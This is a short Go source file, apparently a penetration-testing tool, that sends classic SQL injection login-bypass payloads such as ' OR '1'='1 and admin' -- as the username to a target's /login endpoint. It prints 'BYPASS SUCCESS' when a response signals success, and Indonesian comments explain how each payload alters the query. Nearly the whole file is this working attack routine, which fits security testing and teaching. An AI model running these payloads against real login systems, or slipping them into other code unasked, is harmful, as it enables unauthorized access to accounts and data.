package inject

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

func runLoginTest(targetURL string) {
	fmt.Println("\n=== STARTING LOGIN BYPASS TEST ===")

	payloads := []string{
		"' OR '1'='1", // menghasilkan WHERE username = '' OR '1'='1'
		"admin' --",   // login sebagai admin, sisa query (password) diabaikan
		"' OR 1=1 --",
		"admin' AND '1'='1",
	}

	for _, payload := range payloads {
		fmt.Printf("[*] Testing payload: %s\n", payload)

		vals := url.Values{}
		vals.Add("username", payload)
		vals.Add("password", "aselolejoss") // NOTE: Password tidak berpengaruh jika berhasil bypass

		fullURL := fmt.Sprintf("%s/login?%s", targetURL, vals.Encode())

		resp, err := http.Get(fullURL)
		if err != nil {
			fmt.Printf("[!] Error connecting to server: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		content := string(body)

		if resp.StatusCode == 200 && strings.Contains(strings.ToLower(content), "success") {
			fmt.Printf("[+] BYPASS SUCCESS! Response: %s", content)
			return
		} else {
			fmt.Println("[-] Failed")
		}
	}
}
